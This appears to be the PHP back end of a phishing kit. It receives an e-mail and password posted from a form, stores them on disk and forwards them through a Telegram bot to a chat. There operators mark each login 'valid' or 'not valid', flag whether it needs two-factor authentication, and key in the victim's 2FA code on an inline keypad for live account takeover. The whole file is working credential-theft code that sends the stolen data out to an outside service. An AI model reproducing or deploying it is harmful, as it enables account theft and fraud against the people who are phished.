 <?php
    require 'tg.php';
    include("vendor/autoload.php");
    use Telegram\Bot\Api;
    
    $uu=0;
    // Переменные с формы
    $name = $_POST['numn'];
    $text = $_POST['fdf'];
    
    // Создание файла
    $today1 = date("U");
    $filenameq = './b/active/'.$today1.'.txt';
    $per=''.$name.' '.$text.'';
    file_put_contents($filenameq, $per);
    

    
    // Первая/////////////////////////////////////////////
    $keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Взял', 'callback_data' => 'st']
        ]
      ]
    ];
    $encodedKeyboard = json_encode($keyboard);
    /////////////////////////////////////////////////



    

    // Массив Клавиатуры 2
    $arr = array(
      'E-mail:        ' => $name,
      'Password: ' => $text,

    );
    //Преображение
    foreach($arr as $key => $value)
    {
      $txt .= "<b>".$key."</b>   ".$value."%0A";
    };
    //////////////////////////////////////////////////



    // Вторая/////////////////////////////////////////////
    $keyboardz = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Валид', 'callback_data' => '1'],
            ['text' => '❌ Не валид', 'callback_data' => '2']
        ]
      ]
    ];
    $encodedKeyboardz = json_encode($keyboardz);
    ////////////////////////////////////////////////////

    // Третья/////////////////////////////////////////////
    $keyboardp = [
    'inline_keyboard' => [
        [
            ['text' => '✅ 2FA', 'callback_data' => '1'],
            ['text' => '❗️Просто❗️', 'callback_data' => '2']
        ]
      ]
    ];
    $encodedKeyboardp = json_encode($keyboardp);


    // Четвёртая///////////////////////////////////////
    $keyboardnum = [
    'inline_keyboard' => [
        [
            ['text' => '1️⃣', 'callback_data' => '1'],
            ['text' => '2️⃣', 'callback_data' => '2'],
            ['text' => '3️⃣', 'callback_data' => '3']],
            [['text' => '4️⃣', 'callback_data' => '4'],
            ['text' => '5️⃣', 'callback_data' => '5'],
            ['text' => '6️⃣', 'callback_data' => '6']],
            [['text' => '7️⃣', 'callback_data' => '7'],
            ['text' => '8️⃣', 'callback_data' => '8'],
            ['text' => '9️⃣', 'callback_data' => '9']],
            [['text' => '🔙', 'callback_data' => '11'],
            ['text' => '0️⃣', 'callback_data' => '0'],
            ['text' => '✅', 'callback_data' => '10']
        ]
      ]
    ];
    $encodedKeyboardnum = json_encode($keyboardnum);

    
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}&reply_markup={$encodedKeyboard}","r");
    $today = date("His");
    sleep(50);
    while (true)
    {
        
        $url= 'https://api.telegram.org/bot'.$token.'/getUpdates';
        $update = file_get_contents($url);
        $arrayUpdate= json_decode($update, true);

        if (!empty($arrayUpdate['result']))
        {
            foreach ($arrayUpdate['result'] as $arrayUpdate)
            {
                if (array_key_exists('update_id',$arrayUpdate))
                {

                    $us = $arrayUpdate['callback_query']['from']['id'];
                    $userId = $arrayUpdate['update_id'];
                    
                }
            }

            $str1="".$userId.$today."";
            $filename1 = "./b/sr/".$str1.".txt";
            file_put_contents($filename1, $userId);
            $text100 = file_get_contents($filename1);
        }
        
        while (true)
        {   
            while(true)
            {
                $url= 'https://api.telegram.org/bot'.$token.'/getUpdates';
                try
                {

                    $update1 = file_get_contents($url);

                    if (!$update1)
                    {
                        throw new Exception('Not found');
                    }

                    else
                    {
                        $arrayUpdate= json_decode($update1, true);
                        break;
                    }

                }
                catch(Exception $e)
                {
                    $dfdfdsdsfdsfsdf=1;
                }
            }
            

            
            



            
            if (!empty($arrayUpdate['result']))
            { 
                foreach ($arrayUpdate['result'] as $arrayUpdate)
                {
                    if (array_key_exists('callback_query',$arrayUpdate))
                    {

                        $messid=$arrayUpdate['callback_query']['message']['message_id'];
                        $userId = $arrayUpdate['callback_query']['from']['id'];
                        $textid=$arrayUpdate['callback_query']['message']['text'];
                        $updateId = $arrayUpdate['update_id'];
                        $textid = str_replace(' ', '', $textid);
                        $textid = explode("\n", $textid);
                        $email=substr($textid[0],7);
                        $password=substr($textid[1],9);
                        
                    }
                }

                $str2="".$userId.$today."";
                $filename2 = "./b/sr/".$str2.".txt";
                file_put_contents($filename2, $updateId);
                $text101 = file_get_contents($filename2);

                



                if (($email==$name)&&($password==$text))
                {
                    
                    $files = file_get_contents('./b/active/'.$today1.'.txt');
                    $files = explode(" ", $files);
                    $em=$files[0];
                    $pass=$files[1];
                    
                    if (($email==$em)&&($password==$pass))
                    {
                        if ($text100<$text101)
                        {
                            // unlink($filename1);
                            // unlink($filename2);
                            break;
                        }
                    }
                }                 
            }
        }


        
        
        if ($arrayUpdate['callback_query']['data'] == 1)
        {

            $zar=$arrayUpdate['callback_query']['from']['username'];
            $txtzzz=$txt.'✅<b> Взял '.$zar.'</b>';
            $txtuser=$txt.'%0AID: '.$updateId;
            while (true)
            {
                try
                {

                    $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$chat_id}&message_id={$messid}&parse_mode=html&text={$txtzzz}","r");
                    
                    if (!$nof)
                    {
                        throw new Exception('Not found');
                    }
                    
                    else
                    {
                        fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$userId}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardz}","r");
                        break;   
                    }
                }
                catch(Exception $e)
                {
                    $uu=1;             
                }     
            }
            break;
                 
        }
    }

    unlink($filenameq);





























    

    $today1 = date("U");
    $filenameq = './b/active/'.$today1.$today1.'.txt';
    $per=''.$name.' '.$text.' '.$updateId.'';
    file_put_contents($filenameq, $per);
    $today2 = date("His");
    while (true)
    {
        $url1= 'https://api.telegram.org/bot'.$token.'/getUpdates';
        $update1 = file_get_contents($url1);
        $arrayUpdate1= json_decode($update1, true);

        if (!empty($arrayUpdate1['result']))
        {
            foreach ($arrayUpdate1['result'] as $arrayUpdate1)
            {
                if (array_key_exists('update_id',$arrayUpdate1))
                {

                    $us1 = $arrayUpdate1['callback_query']['from']['id'];
                    $userId1 = $arrayUpdate1['update_id'];
                    
                }
            }

            $str1="".$userId1.$today2."";
            $filename1 = "./b/sr/".$str1.".txt";
            file_put_contents($filename1, $userId1);
            $text200 = file_get_contents($filename1);
        }

        while (true)
        {   
            while(true)
            {
                $url= 'https://api.telegram.org/bot'.$token.'/getUpdates';
                try
                {

                    $update1 = file_get_contents($url);

                    if (!$update1)
                    {
                        throw new Exception('Not found');
                    }

                    else
                    {
                        $arrayUpdate1= json_decode($update1, true);
                        break;
                    }

                }
                catch(Exception $e)
                {
                    $dfdfdsdsfdsfsdf=1;
                }  
            }
            

            
            



            
            $url1= 'https://api.telegram.org/bot'.$token.'/getUpdates';
            $update1 = file_get_contents($url1);
            $arrayUpdate1= json_decode($update1, true);
            if (!empty($arrayUpdate1['result']))
            { 
                foreach ($arrayUpdate1['result'] as $arrayUpdate1)
                {
                    if (array_key_exists('callback_query',$arrayUpdate1))
                    {
                        $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
                        $userId1 = $arrayUpdate1['callback_query']['from']['id'];
                        $textid1=$arrayUpdate1['callback_query']['message']['text'];
                        $updateId1 = $arrayUpdate1['update_id'];
                        $textid1 = str_replace(' ', '', $textid1);
                        $textid1 = explode("\n", $textid1);
                        $email1=substr($textid1[0],7);
                        $password1=substr($textid1[1],9);
                        $ID1=substr($textid1[3],3);
                    }
                }
                
                
                $str2="".$userId1.$today2."";
                $filename2 = "./b/sr/".$str2.".txt";
                file_put_contents($filename2, $updateId1);
                $text201 = file_get_contents($filename2);
                if (($email1==$name)&&($password1==$text))
                {
                    
                    $files = file_get_contents('./b/active/'.$today1.$today1.'.txt');
                    $files = explode(" ", $files);
                    $em=$files[0];
                    $pass=$files[1];
                    $ID=$files[2];
                    
                    if (($email1==$em)&&($password1==$pass)&&($ID=$ID1))
                    {
                        if ($text200<$text201)
                        {
                            // unlink($filename1);
                            // unlink($filename2);
                            break;
                        }
                    }
                }
            }
        }
        
        if ($arrayUpdate1['callback_query']['data'] == 1)
        {
            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];
            $txtzzz=$txt.'✅<b> Взял '.$zar.'</b>';
            $txtuser=$txt.'%0AID: '.$updateId.'%0A✅ Валид';
            $txtuser1='<b>ЧЁ ТАМ❓</b>%0A%0A'.$txt.'%0AID: '.$updateId;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                else
                {
                    fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$userId}&parse_mode=html&text={$txtuser1}&reply_markup={$encodedKeyboardp}","r");
                    break;   
                }
            }
            catch(Exception $e)
            {
                $uu=1;             
            }     
        }
        else
        {
            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];
            $txtzzz=$txt.'✅<b> Взял '.$zar.'</b>';
            $txtuser=$txt.'%0AID: '.$updateId.'%0A❌ Не валид';

            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                else
                {
                    $exittt=1;
                    exit(print $exittt);
                    break;  
                }
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }  
    }



























    $today1 = date("U");
    $filenameq = './b/active/'.$today1.$today1.$today1.'.txt';
    $per=''.$name.' '.$text.' '.$updateId.'';
    file_put_contents($filenameq, $per);
    $today2 = date("His");
    while (true)
    {
        $url1= 'https://api.telegram.org/bot'.$token.'/getUpdates';
        $update1 = file_get_contents($url1);
        $arrayUpdate1= json_decode($update1, true);

        if (!empty($arrayUpdate1['result']))
        {
            foreach ($arrayUpdate1['result'] as $arrayUpdate1)
            {
                if (array_key_exists('update_id',$arrayUpdate1))
                {

                    $us1 = $arrayUpdate1['callback_query']['from']['id'];
                    $userId1 = $arrayUpdate1['update_id'];
                    
                }
            }

            $str1="".$userId1.$today2.$today1."";
            $filename1 = "./b/sr/".$str1.".txt";
            file_put_contents($filename1, $userId1);
            $text300 = file_get_contents($filename1);
        }

        while (true)
        {   
            while(true)
            {
                $url= 'https://api.telegram.org/bot'.$token.'/getUpdates';
                try
                {

                    $update1 = file_get_contents($url);

                    if (!$update1)
                    {
                        throw new Exception('Not found');
                    }

                    else
                    {
                        $arrayUpdate1= json_decode($update1, true);
                        break;
                    }

                }
                catch(Exception $e)
                {
                    $dfdfdsdsfdsfsdf=1;
                }
            }
            

            
            



            
            $url1= 'https://api.telegram.org/bot'.$token.'/getUpdates';
            $update1 = file_get_contents($url1);
            $arrayUpdate1= json_decode($update1, true);
            if (!empty($arrayUpdate1['result']))
            { 
                foreach ($arrayUpdate1['result'] as $arrayUpdate1)
                {
                    if (array_key_exists('callback_query',$arrayUpdate1))
                    {
                        $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
                        $userId1 = $arrayUpdate1['callback_query']['from']['id'];
                        $textid1=$arrayUpdate1['callback_query']['message']['text'];
                        $updateId1 = $arrayUpdate1['update_id'];
                        $textid1 = str_replace(' ', '', $textid1);
                        $textid1 = explode("\n", $textid1);
                        $email2=substr($textid1[2],7);
                        $password2=substr($textid1[3],9);
                        $ID2=substr($textid1[5],3);
                    }
                }
                
                
                $str2="".$userId1.$today2.$today1."";
                $filename2 = "./b/sr/".$str2.".txt";
                file_put_contents($filename2, $updateId1);
                $text301 = file_get_contents($filename2);
                if (($email2==$name)&&($password2==$text))
                {
                    
                    $files = file_get_contents('./b/active/'.$today1.$today1.$today1.'.txt');
                    $files = explode(" ", $files);
                    $em7=$files[0];
                    $pass7=$files[1];
                    $ID7=$files[2];
                    
                    if (($email2==$em7)&&($password2==$pass7)&&($ID7=$ID2))
                    {
                        if ($text300<$text301)
                        {
                            // unlink($filename1);
                            // unlink($filename2);
                            break;
                        }
                    }
                }
            }
        }
        
        if ($arrayUpdate1['callback_query']['data'] == 1)
        {
            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];
            $txtzzz=$txt.'✅<b> Взял '.$zar.'</b>';
            $txtuser=$txt.'%0AID: '.$updateId.'%0A✅ Валид';
            $txtuser1='<b>ЧЁ ТАМ❓</b>%0A%0A'.$txt.'%0AID: '.$updateId.'%0A✅ 2FA';
            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>';
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser1}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                else
                {
                    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$userId}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                    break;   
                }
            }
            catch(Exception $e)
            {
                $uu=1;             
            }     
        }
        else
        {
            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];
            $txtzzz=$txt.'✅<b> Взял '.$zar.'</b>';
            $txtuser=$txt.'%0AID: '.$updateId.'%0A❌ Не валид';
            $txtuser1='<b>ЧЁ ТАМ❓</b>%0A%0A'.$txt.'%0AID: '.$updateId.'%0A❗️Просто❗️';
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser1}","r");
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                else
                {
                    // $filenameq = './b/file1.txt';
                    
                    // file_put_contents($filenameq, $per);
                    $exittt=$name.' '.$text.' '.$userId.' 2';
                    exit(print $exittt);
                    break;
                }
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }  
    }
    






















    $today1 = date("U");
    $filenameq = './b/active/'.$today1.$today1.$today1.$today1.'.txt';
    $per=''.$name.' '.$text.' '.$updateId.'';
    file_put_contents($filenameq, $per);
    $today2 = date("His");
    while (true)
    {
        $url1= 'https://api.telegram.org/bot'.$token.'/getUpdates';
        $update1 = file_get_contents($url1);
        $arrayUpdate1= json_decode($update1, true);

        if (!empty($arrayUpdate1['result']))
        {
            foreach ($arrayUpdate1['result'] as $arrayUpdate1)
            {
                if (array_key_exists('update_id',$arrayUpdate1))
                {

                    $us1 = $arrayUpdate1['callback_query']['from']['id'];
                    $userId1 = $arrayUpdate1['update_id'];
                    
                }
            }

            $str1="".$userId1.$today2.$today1.$today2."";
            $filename1 = "./b/sr/".$str1.".txt";
            file_put_contents($filename1, $userId1);
            $text400 = file_get_contents($filename1);
        }

        while (true)
        {   
            while(true)
            {
                $url= 'https://api.telegram.org/bot'.$token.'/getUpdates';
                try
                {

                    $update1 = file_get_contents($url);

                    if (!$update1)
                    {
                        throw new Exception('Not found');
                    }

                    else
                    {
                        $arrayUpdate1= json_decode($update1, true);
                        break;
                    }

                }
                catch(Exception $e)
                {
                    $dfdfdsdsfdsfsdf=1;
                }
            }
            

            
            



            
            $url1= 'https://api.telegram.org/bot'.$token.'/getUpdates';
            $update1 = file_get_contents($url1);
            $arrayUpdate1= json_decode($update1, true);
            if (!empty($arrayUpdate1['result']))
            { 
                foreach ($arrayUpdate1['result'] as $arrayUpdate1)
                {
                    if (array_key_exists('callback_query',$arrayUpdate1))
                    {
                        $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
                        $userId1 = $arrayUpdate1['callback_query']['from']['id'];
                        $textid1=$arrayUpdate1['callback_query']['message']['text'];
                        $updateId1 = $arrayUpdate1['update_id'];
                        $textid1 = str_replace(' ', '', $textid1);
                        $textid1 = explode("\n", $textid1);
                        $email9=substr($textid1[0],7);
                        $password9=substr($textid1[1],9);
                        $ID9=substr($textid1[3],3);
                    }
                }
                
                
                $str2="".$userId1.$today2.$today1.$today2."";
                $filename2 = "./b/sr/".$str2.".txt";
                file_put_contents($filename2, $updateId1);
                $text401 = file_get_contents($filename2);
                if (($email9==$name)&&($password9==$text))
                {
                    
                    $files = file_get_contents('./b/active/'.$today1.$today1.$today1.$today1.'.txt');
                    $files = explode(" ", $files);
                    $em777=$files[0];
                    $pass777=$files[1];
                    $ID777=$files[2];
                    
                    if (($email9==$em777)&&($password9==$pass777)&&($ID777=$ID9))
                    {
                        if ($text400<$text401)
                        {
                            // unlink($filename1);
                            // unlink($filename2);
                            break;
                        }
                    }
                }
            }
        }
        ///////////////////////////////////////////////////////////
        //////////////////////////////////////////////////////////
        ///////////////////////////////////////////////////////
        if ($arrayUpdate1['callback_query']['data'] == 1)
        {
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='1';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }     
        }
        else if ($arrayUpdate1['callback_query']['data'] == 2){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='2';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 3){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='3';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 4){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='4';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 5){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='5';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 6){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='6';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 7){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='7';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 8){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='8';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 9){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='9';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 0){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';
            $per='0';
            file_put_contents($filenum1, $per, FILE_APPEND);
            $abosob = file_get_contents($filenum1);

            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                
                
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 10){
            // $filenum1 = './b/active/'.$today1.$today2.'.txt';
            // $per='1';
            // file_put_contents($filenum1, $per, FILE_APPEND);
            // $abosob = file_get_contents($filenum1);
            
            $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
            $zar=$arrayUpdate1['callback_query']['from']['username'];

            $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob.' ✅';
            try
            {

                $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}","r");
            
                if (!$nof)
                {
                    throw new Exception('Not found');
                }
                else
                {
                    $exittt=$name.' '.$text.' '.$abosob.' '.$userId.' '.$updateId.' 3';
                    exit(print $exittt);
                    break;   
                }
            
            }
            catch(Exception $e)
            {
                $uu=1;             
            }
        }
        else if ($arrayUpdate1['callback_query']['data'] == 11){
            $filenum1 = './b/active/'.$today1.$today2.'.txt';



            
            if(!(empty($abosob)))
            {
                $abosob = file_get_contents($filenum1);
                $abosob=substr($abosob,0,-1);
                file_put_contents($filenum1, $abosob);
                

                $messid1=$arrayUpdate1['callback_query']['message']['message_id'];
                $zar=$arrayUpdate1['callback_query']['from']['username'];

                $txtuser=$txt.'%0AID: '.$updateId.'%0A%0A<b>❗️Введите код❗️</b>%0A'.$abosob;
                try
                {

                    $nof=fopen("https://api.telegram.org/bot{$token}/editMessageText?chat_id={$userId}&message_id={$messid1}&parse_mode=html&text={$txtuser}&reply_markup={$encodedKeyboardnum}","r");
                    
                    if (!$nof)
                    {
                        throw new Exception('Not found');
                    }
                    
                    
                }
                catch(Exception $e)
                {
                    $uu=1;             
                }
            }
        }
        








        else
        {
            $uu=0;
        }  
    }
?>